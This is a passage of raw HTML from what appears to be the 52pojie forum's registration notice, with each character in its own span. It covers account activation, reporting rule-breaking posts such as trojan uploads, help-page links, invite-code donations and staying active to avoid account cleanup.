style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">看</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">子</span></span></strong><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">9</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p></li></ol><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">奖</span></h2><p style="margin-bottom: 0px; color: rgb(53, 53, 53);"><span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">众</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">热</span><span style="display: inline-block; text-indent: initial;">心</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">员</span><span style="display: inline-block; text-indent: initial;">积</span><span style="display: inline-block; text-indent: initial;">极</span><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">违</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">行</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">协</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">团</span><span style="display: inline-block; text-indent: initial;">队</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">工</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">斑</span><span style="display: inline-block; text-indent: initial;">竹</span><span style="display: inline-block; text-indent: initial;">巡</span><span style="display: inline-block; text-indent: initial;">查</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">辛</span><span style="display: inline-block; text-indent: initial;">勤</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;">益</span><span style="display: inline-block; text-indent: initial;">恢</span><span style="display: inline-block; text-indent: initial;">复</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">常</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">但</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">灌</span><span style="display: inline-block; text-indent: initial;">水</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">冒</span><span style="display: inline-block; text-indent: initial;">充</span><span style="display: inline-block; text-indent: initial;">别</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">品</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">甚</span><span style="display: inline-block; text-indent: initial;">至</span><span style="display: inline-block; text-indent: initial;">投</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">木</span><span style="display: inline-block; text-indent: initial;">马</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">层</span><span style="display: inline-block; text-indent: initial;">出</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">穷</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">虽</span><span style="display: inline-block; text-indent: initial;">然</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">反</span><span style="display: inline-block; text-indent: initial;">病</span><span style="display: inline-block; text-indent: initial;">毒</span><span style="display: inline-block; text-indent: initial;">工</span><span style="display: inline-block; text-indent: initial;">程</span><span style="display: inline-block; text-indent: initial;">师</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">团</span><span style="display: inline-block; text-indent: initial;">队</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">但</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">力</span><span style="display: inline-block; text-indent: initial;">量</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">远</span><span style="display: inline-block; text-indent: initial;">远</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">够</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">里</span><span style="display: inline-block; text-indent: initial;">需</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">参</span><span style="display: inline-block; text-indent: initial;">与</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">秩</span><span style="display: inline-block; text-indent: initial;">序</span><span style="display: inline-block; text-indent: initial;">维</span><span style="display: inline-block; text-indent: initial;">护</span><span style="display: inline-block; text-indent: initial;">中</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">维</span><span style="display: inline-block; text-indent: initial;">护</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">秩</span><span style="display: inline-block; text-indent: initial;">序</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">责</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">尽</span><span style="display: inline-block; text-indent: initial;">自</span><span style="display: inline-block; text-indent: initial;">己</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">份</span><span style="display: inline-block; text-indent: initial;">力</span><span style="display: inline-block; text-indent: initial;">量</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">帮</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">维</span><span style="display: inline-block; text-indent: initial;">护</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">秩</span><span style="display: inline-block; text-indent: initial;">序</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">现</span><span style="display: inline-block; text-indent: initial;">违</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">子</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">投</span><span style="display: inline-block; text-indent: initial;">诉</span><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">区</span><span style="display: inline-block; text-indent: initial;">投</span><span style="display: inline-block; text-indent: initial;">诉</span><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">f</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">u</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">站</span><span style="display: inline-block; text-indent: initial;">点</span><span style="display: inline-block; text-indent: initial;">帮</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">文</span><span style="display: inline-block; text-indent: initial;">档</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><strong><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">般</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">里</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">找</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">！</span></strong><strong><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">?</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">=</span><span style="display: inline-block; text-indent: initial;">f</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">q</span></strong></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">相</span><span style="display: inline-block; text-indent: initial;">关</span><span style="display: inline-block; text-indent: initial;">说</span><span style="display: inline-block; text-indent: initial;">明</span></h2><ul class="list-paddingleft-1" style="padding-left: 0px; color: rgb(53, 53, 53);"><li><p><span style="color: rgb(255, 0, 0); font-size: 14px;"><span style="display: inline-block; text-indent: initial;">对</span><span style="display: inline-block; text-indent: initial;">于</span><span style="display: inline-block; text-indent: initial;">通</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">捐</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">获</span><span style="display: inline-block; text-indent: initial;">取</span><span style="background-color: rgb(255, 255, 0);"><span style="display: inline-block; text-indent: initial;">邀</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span></span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">说</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">赠</span><span style="display: inline-block; text-indent: initial;">送</span><span style="display: inline-block; text-indent: initial;">9</span><span style="display: inline-block; text-indent: initial;">6</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">币</span><span style="display: inline-block; text-indent: initial;">价</span><span style="display: inline-block; text-indent: initial;">值</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">元</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">而</span><span style="display: inline-block; text-indent: initial;">且</span><span style="display: inline-block; text-indent: initial;">免</span><span style="display: inline-block; text-indent: initial;">受</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">跃</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">风</span><span style="display: inline-block; text-indent: initial;">险</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">点</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">同</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">滴</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li><li><p><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">先</span><span style="display: inline-block; text-indent: initial;">自</span><span style="display: inline-block; text-indent: initial;">己</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;">【</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">总</span><span style="display: inline-block; text-indent: initial;">版</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">】</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">[</span><span style="display: inline-block; text-indent: initial;">让</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">速</span><span style="display: inline-block; text-indent: initial;">融</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">庭</span><span style="display: inline-block; text-indent: initial;">]</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">样</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">于</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">融</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">4</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">6</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p></li><li><p><span style="background-color: rgb(255, 255, 0); font-size: 14px;"><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">并</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">意</span><span style="display: inline-block; text-indent: initial;">味</span><span style="display: inline-block; text-indent: initial;">着</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">已</span><span style="display: inline-block; text-indent: initial;">经</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">仅</span><span style="display: inline-block; text-indent: initial;">仅</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">第</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">步</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">坚</span><span style="display: inline-block; text-indent: initial;">持</span><span style="display: inline-block; text-indent: initial;">登</span><span style="display: inline-block; text-indent: initial;">录</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">保</span><span style="display: inline-block; text-indent: initial;">持</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">跃</span><span style="display: inline-block; text-indent: initial;">才</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">保</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">庭</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">每</span><span style="display: inline-block; text-indent: initial;">次</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">只</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">完</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">就</span><span style="display: inline-block; text-indent: initial;">完</span><span style="display: inline-block; text-indent: initial;">事</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">续</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">坚</span><span style="display: inline-block; text-indent: initial;">持</span><span style="display: inline-block; text-indent: initial;">登</span><span style="display: inline-block; text-indent: initial;">陆</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">或</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">导</span><span style="display: inline-block; text-indent: initial;">致</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">最</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">希</span><span style="display: inline-block; text-indent: initial;">望</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: 